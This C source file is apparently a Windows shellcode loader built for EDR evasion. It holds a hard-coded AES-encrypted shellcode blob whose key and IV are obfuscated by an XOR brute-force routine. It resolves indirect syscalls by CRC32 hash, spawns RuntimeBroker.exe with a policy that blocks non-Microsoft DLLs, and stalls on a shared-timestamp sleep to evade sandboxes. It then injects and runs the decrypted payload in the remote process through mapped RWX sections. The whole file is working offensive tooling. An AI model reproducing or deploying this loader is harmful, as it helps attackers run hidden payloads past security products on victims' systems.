#include <Windows.h>
#include <stdio.h>

#include "Structs.h"
#include "HellsHall.h"
#include "CtAes.h"

// -------------------------------- //// -------------------------------- //// -------------------------------- //

unsigned char AESKey[32] = {
        0x8C, 0x08, 0xA5, 0x68, 0xA8, 0x52, 0x33, 0xBE, 0xB6, 0x47, 0xEA, 0x9B, 0x96, 0x5A, 0x41, 0xB3,
        0xD5, 0x41, 0x56, 0x92, 0x06, 0xDB, 0x2A, 0xE2, 0x07, 0xFC, 0x2B, 0xD8, 0xCB, 0x6E, 0x5F, 0x9E
};

unsigned char AESIv[16] = {
        0x6A, 0xA9, 0xB1, 0x1E, 0x43, 0x06, 0x21, 0x91, 0x81, 0xED, 0x89, 0x84, 0xA9, 0xC6, 0x00, 0x6F
};

unsigned char EncryptedShellcode[288] = {
        0x21, 0xE9, 0x87, 0xF8, 0x84, 0xC3, 0xC2, 0xCE, 0xBE, 0x21, 0xDF, 0xF1, 0xC6, 0x6D, 0x41, 0x1A,
        0xA4, 0x43, 0x8B, 0xC6, 0x78, 0xD8, 0xD0, 0x6C, 0xFC, 0xBE, 0x01, 0x75, 0xEE, 0x1B, 0xBF, 0xBE,
        0x8D, 0x10, 0x36, 0x04, 0x10, 0xAE, 0x61, 0xDB, 0x92, 0xB8, 0x67, 0x46, 0x47, 0x74, 0x94, 0x08,
        0x09, 0x45, 0x12, 0x9A, 0x80, 0x0D, 0x88, 0x6A, 0xE1, 0xA9, 0x69, 0xD6, 0x1D, 0xC1, 0x62, 0x53,
        0xCD, 0x34, 0x22, 0x06, 0x22, 0x7B, 0xC5, 0xBB, 0xAA, 0xB5, 0xBB, 0x5F, 0xC8, 0xC6, 0xB1, 0x29,
        0x0D, 0x87, 0x99, 0xD2, 0xDE, 0x94, 0xC4, 0x71, 0xD7, 0x42, 0x71, 0xF1, 0x37, 0x64, 0x8F, 0x43,
        0xA4, 0x56, 0x21, 0x7E, 0x48, 0x25, 0xCD, 0xA7, 0x2C, 0x12, 0xC1, 0xC3, 0xB7, 0x18, 0x6A, 0x2A,
        0xFB, 0xF6, 0x5F, 0x8A, 0xFE, 0xE4, 0xD6, 0xB0, 0x73, 0x62, 0x69, 0x6E, 0xAF, 0x8C, 0x3B, 0x4E,
        0x02, 0xDA, 0x06, 0x05, 0x43, 0x45, 0x1D, 0x76, 0xE2, 0x16, 0xE8, 0xD3, 0x17, 0x79, 0xD9, 0x4D,
        0x9A, 0x52, 0xB3, 0x39, 0x08, 0x7F, 0x5B, 0x1A, 0xAF, 0xCD, 0x71, 0x82, 0x70, 0xAB, 0xBC, 0x60,
        0xD2, 0xC6, 0x12, 0x79, 0xD2, 0x72, 0xC9, 0x80, 0x89, 0x97, 0xCD, 0xDE, 0xD8, 0xE1, 0xDC, 0xE7,
        0xC6, 0x02, 0x42, 0xB5, 0xC3, 0xE9, 0xA9, 0xCD, 0xF5, 0x6C, 0xF7, 0x35, 0x58, 0xA3, 0xFD, 0x9F,
        0xF8, 0x6D, 0x47, 0x1C, 0x5B, 0x80, 0x06, 0x0C, 0x8B, 0x5E, 0xAB, 0x0A, 0xE1, 0x11, 0x88, 0xDE,
        0x5F, 0xFA, 0xEA, 0x21, 0xF6, 0x78, 0x5D, 0xDA, 0x98, 0x9C, 0x20, 0x23, 0xC0, 0x17, 0x0C, 0xD9,
        0x26, 0x99, 0x49, 0xD0, 0xE8, 0x9A, 0x26, 0x4C, 0x8C, 0x14, 0x8C, 0x5B, 0xB3, 0x58, 0x68, 0xC2,
        0x62, 0xEB, 0x8D, 0xC2, 0x15, 0x22, 0xDD, 0x2A, 0x6D, 0x98, 0x1C, 0x02, 0x19, 0xBC, 0xA0, 0xFF,
        0xB2, 0xE1, 0x54, 0x49, 0xAA, 0xC0, 0xED, 0xF6, 0x70, 0xCC, 0x1B, 0x86, 0xEE, 0x63, 0x27, 0xD5,
        0xF4, 0xD2, 0x12, 0x80, 0xC2, 0x7E, 0xBC, 0xB7, 0xCA, 0x18, 0x3E, 0xAC, 0x6B, 0xD3, 0x9F, 0x37
};

// -------------------------------- //// -------------------------------- //// -------------------------------- //

BYTE BruteForceDecryptionKey(IN PBYTE pKeyArray, IN SIZE_T sKeySize) {

    int i = 0x00;

    for (i = 0; i <= 0xFF; i++) {

        if (((pKeyArray[1] ^ i) % 0xFF) == 0x2B) {
            break;
        }
    }

    for (int x = 0; x < sKeySize; x++)
        pKeyArray[x] = pKeyArray[x] ^ i;

    return i;
}

BYTE BruteForceDecryptionIv(IN PBYTE pKeyArray, IN SIZE_T sKeySize) {

    int i = 0x00;

    for (i = 0; i <= 0xFF; i++) {

        if (((pKeyArray[1] ^ i) % 0xFF) == 0xC2) {
            break;
        }
    }

    for (int x = 0; x < sKeySize; x++)
        pKeyArray[x] = pKeyArray[x] ^ i;

    return i;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

BOOL InstallAesDecryptionViaCtAes(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE pAesKey, IN PBYTE pAesIv, OUT PBYTE* ppPlainTextBuffer) {

	AES256_CBC_ctx	AesCtx = { 0x00 };

	if (!pCipherTextBuffer || !sCipherTextSize || !ppPlainTextBuffer || !pAesKey || !pAesIv)
		return FALSE;

	/*
	if (!(*ppPlainTextBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sCipherTextSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		return FALSE;
	}
	*/

	RtlSecureZeroMemory(&AesCtx, sizeof(AES256_CBC_ctx));
	AES256_CBC_init(&AesCtx, pAesKey, pAesIv);
	AES256_CBC_decrypt(&AesCtx, (sCipherTextSize / 16), *ppPlainTextBuffer, pCipherTextBuffer);

	return TRUE;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

// Calculated CRC Hash Values
#define NtCreateUserProcess_CRC32		0x2B09FF3F

typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx)(
	PRTL_USER_PROCESS_PARAMETERS* 		pProcessParameters,
	PUNICODE_STRING				ImagePathName,
	PUNICODE_STRING				DllPath,
	PUNICODE_STRING				CurrentDirectory,
	PUNICODE_STRING				CommandLine,
	PVOID					Environment,
	PUNICODE_STRING				WindowTitle,
	PUNICODE_STRING				DesktopInfo,
	PUNICODE_STRING				ShellInfo,
	PUNICODE_STRING				RuntimeData,
	ULONG					Flags
);

// -------------------------------- //// -------------------------------- //// -------------------------------- //

VOID RtlInitUnicodeString(IN OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString) {

	SIZE_T DestSize;

	if (SourceString)
	{
		DestSize = wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

BOOL BlockDllPolicyViaNtCreateUserProcess(IN LPWSTR szProcessPath, IN OPTIONAL LPWSTR szProcessParms, OUT PHANDLE phProcess, OUT PHANDLE phThread) {

	if (!szProcessPath || !szProcessParms || !phProcess || !phThread)
		return FALSE;

	BOOL				bResult 			= FALSE;
	fnRtlCreateProcessParametersEx	pRtlCreateProcessParametersEx 	= NULL;
	NTSTATUS			STATUS 				= 0x00;
	PPS_ATTRIBUTE_LIST		pAttributeList	 		= NULL;
	PRTL_USER_PROCESS_PARAMETERS	pUserProcessParams 		= NULL;
	PWCHAR				pwcDuplicateStr 		= NULL,
					pwcLastSlash 			= NULL,
					pszNtProcessPath 		= NULL,
					pszFullProcessParm 		= NULL;
	UNICODE_STRING			NtImagePath 			= { 0 },
					ProcCommandLine 		= { 0 },
					ProcCurrentDir 			= { 0 };
	PS_CREATE_INFO			PsCreateInfo 			= { 0 };
	NT_SYSCALL			NtCreateUserProcess 		= { 0 };
	DWORD64                         dw64BlockDllPolicy 		= PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	if (!FetchNtSyscall(NtCreateUserProcess_CRC32, &NtCreateUserProcess)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateUserProcess \n");
		return FALSE;
	}

	if (!(pRtlCreateProcessParametersEx = GetProcAddress(GetModuleHandleW(TEXT("NTDLL")), "RtlCreateProcessParametersEx"))) {
		printf("[!] GetProcAddress Failed With Error: %d\n", GetLastError());
		return FALSE;
	}

	if (!(pAttributeList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (sizeof(PS_ATTRIBUTE_LIST) + 2 * sizeof(PS_ATTRIBUTE))))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pwcDuplicateStr = _wcsdup(szProcessPath))) {
		printf("[!] Failed To Duplicate \"%ws\" - %d\n", szProcessPath, __LINE__);
		goto _END_OF_FUNC;
	}

	if (pwcLastSlash = wcsrchr(pwcDuplicateStr, L'\\'))
		*pwcLastSlash = L'\0';

	if (!(pszNtProcessPath = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (wcslen(szProcessPath) * sizeof(WCHAR) + sizeof(L"\\??\\"))))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pszFullProcessParm = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ((wcslen(szProcessPath) * sizeof(WCHAR)) + (szProcessParms ? (wcslen(szProcessParms) * sizeof(WCHAR)) : 0x00))))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	wsprintfW(pszNtProcessPath, L"\\??\\%s", szProcessPath);
	// Append the process parameters to the process path (if exists)
	if (szProcessParms)
		wsprintfW(pszFullProcessParm, L"%s %s", szProcessPath, szProcessParms);
	else
		wsprintfW(pszFullProcessParm, L"%s", szProcessPath);
	
	RtlInitUnicodeString(&NtImagePath, pszNtProcessPath);
	RtlInitUnicodeString(&ProcCommandLine, pszFullProcessParm);
	RtlInitUnicodeString(&ProcCurrentDir, pwcDuplicateStr);

	if (!NT_SUCCESS((STATUS = pRtlCreateProcessParametersEx(&pUserProcessParams, &NtImagePath, NULL, &ProcCurrentDir, &ProcCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED)))) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	pAttributeList->TotalLength 			= sizeof(PS_ATTRIBUTE_LIST) + 2 * sizeof(PS_ATTRIBUTE);
	pAttributeList->Attributes[0].Attribute 	= PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList->Attributes[0].Size 		= NtImagePath.Length;
	pAttributeList->Attributes[0].Value 		= (ULONG_PTR)NtImagePath.Buffer;

	pAttributeList->Attributes[1].Attribute 	= PS_ATTRIBUTE_MITIGATION_OPTIONS;
	pAttributeList->Attributes[1].Size 		= sizeof(DWORD64);
	pAttributeList->Attributes[1].Value 		= &dw64BlockDllPolicy;

	PsCreateInfo.Size 				= sizeof(PS_CREATE_INFO);
	PsCreateInfo.State 				= PsCreateInitialState;

	SET_SYSCALL(NtCreateUserProcess);
	if (!NT_SUCCESS((STATUS = RunSyscall(phProcess, phThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0x00, 0x00, pUserProcessParams, &PsCreateInfo, pAttributeList)))) {
		printf("[!] NtCreateUserProcess Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (pAttributeList)
		HeapFree(GetProcessHeap(), 0x00, pAttributeList);
	if (pszNtProcessPath)
		HeapFree(GetProcessHeap(), 0x00, pszNtProcessPath);
	if (pszFullProcessParm)
		HeapFree(GetProcessHeap(), 0x00, pszFullProcessParm);
	return bResult;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //


// Calculated CRC Hash Values
#define NtCreateSection_CRC32				0xF85C77EC
#define NtMapViewOfSection_CRC32			0xB347A7C1
#define NtCreateThreadEx_CRC32				0x6411D915
#define NtWaitForSingleObject_CRC32			0x3D93EDA4
#define NtUnmapViewOfSection_CRC32			0x830A04FC
#define NtClose_CRC32					0x0EDFC5CB

// -------------------------------- //// -------------------------------- //// -------------------------------- //

typedef struct _NTAPI_FUNC
{
	NT_SYSCALL	NtCreateSection;
	NT_SYSCALL	NtMapViewOfSection;
	NT_SYSCALL	NtCreateThreadEx;
	NT_SYSCALL	NtWaitForSingleObject;
	NT_SYSCALL	NtUnmapViewOfSection;
	NT_SYSCALL	NtClose;

} NTAPI_FUNC, * PNTAPI_FUNC;

NTAPI_FUNC g_NTAPI = { 0 };

// -------------------------------- //// -------------------------------- //// -------------------------------- //

BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtCreateSection_CRC32, &g_NTAPI.NtCreateSection)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateSection \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtMapViewOfSection_CRC32, &g_NTAPI.NtMapViewOfSection)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtMapViewOfSection \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &g_NTAPI.NtCreateThreadEx)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &g_NTAPI.NtWaitForSingleObject)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtUnmapViewOfSection_CRC32, &g_NTAPI.NtUnmapViewOfSection)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtUnmapViewOfSection \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtClose_CRC32, &g_NTAPI.NtClose)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtClose \n");
		return FALSE;
	}

	return TRUE;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

ULONG64 SharedTimeStamp() {

	LARGE_INTEGER TimeStamp = {
		.LowPart 	= USER_SHARED_DATA->SystemTime.LowPart,
		.HighPart 	= USER_SHARED_DATA->SystemTime.High1Time
	};

	return TimeStamp.QuadPart;
}

VOID SharedSleep(IN ULONG64 uMilliseconds) {

	ULONG64	uStart = SharedTimeStamp() + (uMilliseconds * DELAY_TICKS);

	for (SIZE_T RandomNmbr = 0x00; SharedTimeStamp() < uStart; RandomNmbr++);

	if ((SharedTimeStamp() - uStart) > 2000)
		return;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

BOOL RemoteMappingInjectionViaIndirectSyscalls(IN HANDLE hProcess, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {

	BOOL			bResult 		= FALSE;
	NTSTATUS		STATUS 			= 0x00;
	PBYTE			pLocalTmpAddress 	= NULL,
				pRemoteTmpAddress 	= NULL;
	HANDLE			hSection 		= NULL,
				hThread 		= NULL;
	SIZE_T			sViewSize 		= 0x00;
	LARGE_INTEGER		MaximumSize 		= { .LowPart = sShellcodeSize };

	if (!hProcess || !pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
		return FALSE;

	if (!InitializeNtSyscalls())
		return FALSE;

	SET_SYSCALL(g_NTAPI.NtCreateSection);
	if (!NT_SUCCESS((STATUS = RunSyscall(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)))) {
		printf("[!] NtCreateSection Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	SET_SYSCALL(g_NTAPI.NtMapViewOfSection);
	if (!NT_SUCCESS((STATUS = RunSyscall(hSection, NtCurrentProcess(), &pLocalTmpAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_READWRITE))) || pLocalTmpAddress == NULL) {
		printf("[!] NtMapViewOfSection [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	SET_SYSCALL(g_NTAPI.NtMapViewOfSection);
	if (!NT_SUCCESS((STATUS = RunSyscall(hSection, hProcess, &pRemoteTmpAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE))) || pRemoteTmpAddress == NULL) {
		printf("[!] NtMapViewOfSection [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	//\
	memcpy(pLocalTmpAddress, pShellcodeAddress, sShellcodeSize);

	SharedSleep(5 * 1000);

	if (!BruteForceDecryptionKey(AESKey, 32))
		goto _END_OF_FUNC;

	SharedSleep(5 * 1000);

	if (!BruteForceDecryptionIv(AESIv, 16))
		goto _END_OF_FUNC;
	
	SharedSleep(5 * 1000);

	if (!InstallAesDecryptionViaCtAes(pShellcodeAddress, sShellcodeSize, AESKey, AESIv, &pLocalTmpAddress))
		goto _END_OF_FUNC;

	SET_SYSCALL(g_NTAPI.NtUnmapViewOfSection);
	if (!NT_SUCCESS((STATUS = RunSyscall(NtCurrentProcess(), pLocalTmpAddress)))) {
		printf("[!] NtUnmapViewOfSection [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		return FALSE;
	}

	pLocalTmpAddress = NULL;

	SET_SYSCALL(g_NTAPI.NtCreateThreadEx);
	if (!NT_SUCCESS((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteTmpAddress, NULL, FALSE, NULL, NULL, NULL, NULL)))) {
		printf("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (phThread)
		*phThread = hThread;
	*ppInjectionAddress = pRemoteTmpAddress;

	SET_SYSCALL(g_NTAPI.NtWaitForSingleObject);
	if (!NT_SUCCESS((STATUS = RunSyscall(hThread, FALSE, NULL)))) {
		printf("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (pLocalTmpAddress) {
		SET_SYSCALL(g_NTAPI.NtUnmapViewOfSection);
		if (!NT_SUCCESS((STATUS = RunSyscall(NtCurrentProcess(), pLocalTmpAddress)))) {
			printf("[!] NtUnmapViewOfSection [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
			return FALSE;
		}
	}

	/*
	SET_SYSCALL(g_NTAPI.NtUnmapViewOfSection);
	if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, pRemoteTmpAddress)))) {
		printf("[!] NtUnmapViewOfSection [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		return FALSE;
	}
	*/

	if (hSection) {
		SET_SYSCALL(g_NTAPI.NtClose);
		if (!NT_SUCCESS((STATUS = RunSyscall(hSection)))) {
			printf("[!] NtClose Failed With Error: 0x%0.8X \n", STATUS);
			return FALSE;
		}
	}

	return bResult;
}

// -------------------------------- //// -------------------------------- //// -------------------------------- //

int main() {

	HANDLE	hProcess	= NULL,
		hThread		= NULL;

	if (!BlockDllPolicyViaNtCreateUserProcess(L"C:\\Windows\\System32\\RuntimeBroker.exe", L"-Embedding", &hProcess, &hThread))
		return -1;

	printf("[DEBUG] Process PID: %d \n", GetProcessId(hProcess));
	printf("[DEBUG] Thread TID: %d \n", GetThreadId(hThread));

	CloseHandle(hThread);

	ULONG_PTR	uAddress	= NULL;

	if (!RemoteMappingInjectionViaIndirectSyscalls(hProcess, EncryptedShellcode, sizeof(EncryptedShellcode), &uAddress, NULL))
		return -1;


	printf("[DEBUG] Allocated Address: 0x%p \n", uAddress);

	return 0;
}
